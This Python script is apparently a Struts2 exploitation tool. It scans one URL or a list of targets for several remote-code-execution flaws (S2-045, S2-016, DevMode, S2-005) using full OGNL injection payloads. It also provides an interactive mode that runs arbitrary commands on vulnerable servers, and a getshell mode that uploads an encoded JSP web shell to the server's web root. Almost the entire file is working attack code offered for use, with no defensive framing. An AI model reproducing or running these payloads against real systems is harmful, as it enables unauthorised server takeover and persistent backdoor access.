#!/usr/bin/env python
#Author: yins
#Blog: http://yins0.me

import requests,sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#scan 045/016/Devmode/005
try:
    targer = sys.argv[2]
    payload_045 = ["%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='","id","').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"]
    payload_016 = ["?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'","id","'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"]
    payload_Devmode = ["?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath888888&command=","id"]
    payload_005 = [r"?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'","id",r"\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))"]
    shell_code = "%3C%25%40+page+language%3D%22java%22+pageEncoding%3D%22gbk%22%25%3E%3Cjsp%3Adirective.page+import%3D%22java.io.File%22%2F%3E%3Cjsp%3Adirective.page+import%3D%22java.io.OutputStream%22%2F%3E%3Cjsp%3Adirective.page+import%3D%22java.io.FileOutputStream%22%2F%3E%3C%25+int+i%3D0%3BString+method%3Drequest.getParameter%28%22act%22%29%3Bif%28method%21%3Dnull%26%26method.equals%28%22yoco%22%29%29%7BString+url%3Drequest.getParameter%28%22url%22%29%3BString+text%3Drequest.getParameter%28%22smart%22%29%3BFile+f%3Dnew+File%28url%29%3Bif%28f.exists%28%29%29%7Bf.delete%28%29%3B%7Dtry%7BOutputStream+o%3Dnew+FileOutputStream%28f%29%3Bo.write%28text.getBytes%28%29%29%3Bo.close%28%29%3B%7Dcatch%28Exception+e%29%7Bi%2B%2B%3B%25%3E0%3C%25%7D%7Dif%28i%3D%3D0%29%7B%25%3E1%3C%25%7D%25%3E%3Cform+action%3D%27%3Fact%3Dyoco%27+method%3D%27post%27%3E%3Cinput+size%3D%22100%22+value%3D%22%3C%25%3Dapplication.getRealPath%28%22%2F%22%29+%25%3E%22+name%3D%22url%22%3E%3Cbr%3E%3Ctextarea+rows%3D%2220%22+cols%3D%2280%22+name%3D%22smart%22%3E"
    def s2_045():
        try:
            payload_045[1] = "id"
            headers = {"Content-Type": payload_045[0]+payload_045[1]+payload_045[2]}
            s2_045_get = requests.get(url=targer, headers=headers, verify=False,timeout=2)
            if 'uid=' in s2_045_get.text:
                print targer + " s2-045(Linux) Vulnerabilities exist!!!"
            else:
                payload_045[1] = "ver"
                headers = {"Content-Type": payload_045[0]+payload_045[1]+payload_045[2]}
                s2_045_get = requests.get(
                url=targer, headers=headers, verify=False,timeout=2)
                if 'Microsoft Windows' in s2_045_get.text:
                    print targer + " s2-045(Windows) Vulnerabilities exist!!!"
                else:
                    print targer + " s2-045 vulnerability does not exist."
        except Exception:
                    print (targer + " s2_005 Scan fail.")
    def s2_016():
        try:
            payload_016[1] = "id"
            exploit = targer+payload_016[0]+payload_016[1]+payload_016[2]
            s2_016_get = requests.get(url=exploit,verify=False,timeout=2)
            if 'uid=' in s2_016_get.text:
                print targer + " s2-016(Linux) Vulnerabilities exist!!!"
            else:
                payload_016[1] = "ver"
                exploit = targer+payload_016[0]+payload_016[1]+payload_016[2]
                s2_016_get = requests.get(url=exploit,verify=False,timeout=2)
                if 'Microsoft Windows' in s2_016_get.text:
                    print targer + " s2-016(Windows) Vulnerabilities exist!!!"
                else:
                    print targer + " s2-016 vulnerability does not exist."
        except Exception:
                    print (targer + " s2_016 Scan fail.")
    def s2_DevMode():
        try:
            payload_Devmode[1] = "id"
            s2_Devmode_get = requests.get(url=targer+payload_Devmode[0]+payload_Devmode[1], verify=False,timeout=2)
            if 'uid=' in s2_Devmode_get.text:
                print targer + " s2_Devmode(Linux) Vulnerabilities exist!!!"
            else:
                payload_Devmode[1] = "ver"
                s2_Devmode_get = requests.get(url=targer+payload_Devmode[0]+payload_Devmode[1], verify=False,timeout=2)
                if "Microsoft Windows" in s2_Devmode_get.text:
                    print targer + " s2_Devmode(Windows) Vulnerabilities exist!!!"
                else:
                    print targer + " s2_Devmode vulnerability does not exist."
        except Exception:
                    print (targer + " s2_Devmode Scan fail.")
    def s2_005():
        try:
            payload_005[1] = "id"
            s2_005_get = requests.get(url=targer+payload_005[0]+payload_005[1]+payload_005[2],verify=False,timeout=2)
            if 'uid=' in s2_005_get.text:
                print targer + " s2_005(Linux) Vulnerabilities exist!!!"
            else:
                payload_005[1] = "ver"
                s2_005_get = requests.get(url=targer+payload_005[0]+payload_005[1]+payload_005[2], verify=False,timeout=2)
                if "Microsoft Windows" in s2_005_get.text:
                    print targer + " s2_005(Windows) Vulnerabilities exist!!!"
                else:
                    print targer + " s2_005 vulnerability does not exist."
        except Exception:
                    print (targer + " s2_005 Scan fail")
    if sys.argv[1] == "--url":
        targer = sys.argv[2]
        s2_045(),s2_016(),s2_DevMode(),s2_005()
    if sys.argv[1] == "--list":
        file = sys.argv[2]
        url = open(file)
        for links in url.readlines():
            targer = links.strip()
            s2_045(),s2_016(),s2_DevMode(),s2_005()

    #Opencmd
    def opencmd():
        cmd = requests.get(url=targer+payload,verify=False)
        print cmd.text
        if cmd_shell == "exit":
            sys.exit()
    if sys.argv[1] == "--cmd":
        try:
            vuln = raw_input("Input vuln(045/016/Devmode/005): ")
            if vuln == "045":
                while True:
                    cmd_shell = raw_input("cmd>>> ")
                    payload_045[1] = cmd_shell
                    headers = {'Content-Type':payload_045[0]+payload_045[1]+payload_045[2]}
                    cmd = requests.get(url=targer,headers=headers,verify=False)
                    print cmd.text
                    if cmd_shell == "exit":
                        sys.exit()
            if vuln == "016":
                print "s2-016 CMD 'netstat -ano' = netstat','-ano "
                while True:
                    cmd_shell = raw_input("cmd>>> ")
                    payload_016[1] = cmd_shell
                    payload = payload_016[0]+payload_016[1]+payload_016[2]
                    opencmd()
            if vuln == "Devmode":
                while True:
                    cmd_shell = raw_input("cmd>>> ")
                    payload_Devmode[1] = cmd_shell
                    payload = payload_Devmode[0]+payload_Devmode[1]
                    opencmd()
            if vuln == "005":
                while True:
                    cmd_shell = raw_input("cmd>>> ")
                    payload_005[1] = cmd_shell
                    payload = payload_005[0]+payload_005[1]+payload_005[2]
                    opencmd()
        except Exception:
            print "Open cmd Fait!"
    #// Getshell
    try:
        if sys.argv[1] == "--getshell":
            vuln = raw_input("Input vlun(045/016):  ")
            if vuln == "045":
                path_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
                headers = {'content-type':path_payload}
                path = requests.get(url=targer,headers=headers)
                getshell_payload = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter("f")),#fos.write(#req.getParameter("t").getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println("okokokok"),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))}"""
                url = targer + "/?t=" + shell_code + "&f=" +path.text.strip() + "helloyins.jsp"
                headers = {'Content-Type':getshell_payload}
                getshell= requests.get(url=url,headers=headers)
                if "okok" in getshell.text:
                    print "helloyins.jsp"
                else:
                    print "Wite /helloyins.jsp success!"
            if vuln == "016":
                payload = r"""?redirect:${
                %23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),
                %23p%3d(%23req.getRealPath(%22/%22)%2b%22helloyins.jsp%22).replaceAll("\\\\", "/"),
                new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()
                }&c="""+shell_code
                getshell = requests.get(url=targer+payload)
                if getshell.status_code != "404":
                    print "Wite /helloyins.jsp success!"

    except Exception:
        print "Getshell Fait."
except Exception:
    print """
             python s2scan.py --list url.txt
             python s2scan.py --url http://yins0.me/index.action
             python s2scan.py --cmd http://yins0.me/index.action
             python s2scan.py --getshell http://yins0.me/index.action
          """
